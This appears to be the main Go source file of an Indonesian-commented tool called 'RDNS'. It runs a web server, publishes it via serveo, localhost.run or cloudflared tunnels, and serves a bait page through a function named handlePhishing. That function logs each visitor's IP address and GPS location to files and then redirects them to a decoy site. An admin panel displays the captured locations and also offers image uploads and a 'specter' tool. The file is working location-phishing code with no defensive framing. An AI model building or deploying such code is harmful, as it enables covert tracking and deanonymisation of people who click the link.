package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
	"rdns_suite/tools"
)

const (
	dbGeo = "logs_geo.db"; dbMeta = "logs_meta.db"
	sessGeo = "session_geo.tmp"; sessMeta = "session_meta.tmp"
	custFile = "custom.txt"
	toolsDir = "./tools/"
)

var tunnelCmd *exec.Cmd

// Fungsi untuk menjalankan tunneling secara otomatis
func startTunnel(provider string) {
	// Matikan tunnel yang sedang berjalan jika ada
	if tunnelCmd != nil && tunnelCmd.Process != nil {
		tunnelCmd.Process.Kill()
	}
	os.Remove("tunnel.log")

	var cmdStr string
	switch provider {
	case "serveo":
		cmdStr = "ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:9090 serveo.net > tunnel.log 2>&1"
	case "localhost":
		cmdStr = "ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:9090 localhost.run > tunnel.log 2>&1"
	default: // cloudflare
		cmdStr = "cloudflared tunnel --url http://127.0.0.1:9090 > tunnel.log 2>&1"
	}

	tunnelCmd = exec.Command("sh", "-c", cmdStr)
	go tunnelCmd.Run()
}

func main() {
	// Buat folder tools jika belum ada (untuk menyimpan hasil cleaned_image)
	os.MkdirAll(toolsDir, 0755)
	printBanner()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query()
		admin, tool, action := q.Get("admin"), q.Get("tool"), q.Get("action")

		// 1. TARGET PAGE LOGIC (Pancingan Lokasi)
		if q.Get("v") != "" {
			handlePhishing(w, r, q.Get("l"))
			return
		}

		// 2. ADMIN PANEL RDNS
		if admin == "rdns" {
			
			// --- FIX: GEOLOCATE LAUNCH HANDLER ---
			if tool == "geolocate" && action == "launch" {
				provider := r.FormValue("provider")
				fmt.Printf("\033[33m[!] Launching Tunnel via: %s...\033[0m\n", provider)
				startTunnel(provider)
				// Redirect ke Workbench (Monitoring)
				http.Redirect(w, r, "?admin=rdns&tool=geolocate&exec=true", http.StatusFound)
				return
			}

			// --- METADATA LOGIC ---
			isMetaProc := false
			var metaData map[string]string
			if r.Method == "POST" && tool == "metadata" {
				file, head, err := r.FormFile("imagefile")
				if err == nil {
					defer file.Close()
					isMetaProc = true
					metaData = map[string]string{
						"name": head.Filename, 
						"size": fmt.Sprintf("%.2f KB", float64(head.Size)/1024.0),
						"time": time.Now().Format("15:04:05"),
						"ip": r.RemoteAddr,
					}
					out, _ := os.Create(toolsDir + "cleaned_image.jpg")
					io.Copy(out, file)
					out.Close()
					log := fmt.Sprintf("%s|%s|Stripped: %s\n", time.Now().Format("15:04:05"), r.RemoteAddr, head.Filename)
					f, _ := os.OpenFile(dbMeta, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); f.WriteString(log); f.Close()
					fs, _ := os.OpenFile(sessMeta, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); fs.WriteString(log); fs.Close()
				}
			}

			if tool == "metadata" && action == "download" {
				f, _ := os.ReadFile(toolsDir + "cleaned_image.jpg")
				w.Header().Set("Content-Disposition", "attachment; filename=RDNS_SAFE.jpg")
				w.Write(f)
				return
			}

			// --- ROUTING UI ---
			renderHeader(w, "id")
			switch tool {
			case "geolocate":
				if q.Get("exec") == "true" {
					d, _ := os.ReadFile(sessGeo)
					renderWorkbench(w, strings.Split(strings.TrimSpace(string(d)), "\n"), "id")
				} else { 
					renderGeoConfig(w) // Tampilan Konfigurasi & Tombol Launch
				}
			case "metadata":
				d, _ := os.ReadFile(sessMeta)
				tools.RenderMetaStripper(w, "id", isMetaProc, metaData, strings.Split(strings.TrimSpace(string(d)), "\n"))
			case "specter":
				if q.Get("exec") == "true" {
					tools.RenderSpecter(w, r.FormValue("target"))
				} else { renderArticle(w, "specter", "id") }
			case "archive":
				renderArchive(w, "id")
			default:
				renderLobby(w, "id")
			}
			fmt.Fprintf(w, "</div></body></html>")
			return
		}
		renderTarget(w)
	})

	fmt.Println("\033[32m[+] Server RDNS Master LIVE di http://127.0.0.1:9090\033[0m")
	http.ListenAndServe(":9090", nil)
}

func handlePhishing(w http.ResponseWriter, r *http.Request, loc string) {
	if loc == "" { loc = "WAITING_GPS" }
	log := fmt.Sprintf("%s|%s|%s\n", time.Now().Format("15:04:05"), r.RemoteAddr, loc)
	f, _ := os.OpenFile(dbGeo, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); f.WriteString(log); f.Close()
	fs, _ := os.OpenFile(sessGeo, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); fs.WriteString(log); fs.Close()
	
	target, _ := os.ReadFile(custFile)
	url := strings.TrimSpace(string(target))
	if url == "" { url = "https://www.google.com" }
	http.Redirect(w, r, url, http.StatusFound)
}

func printBanner() {
	fmt.Println("\033[36m" + `
    ____  ____  _   _ ____  
   |  _ \|  _ \| \ | / ___| 
   | |_) | | | |  \| \___ \ 
   |  _ <| |_| | |\  |___) |
   |_| \_\____/|_| \_|____/ V2.7 MASTER` + "\033[0m")
}
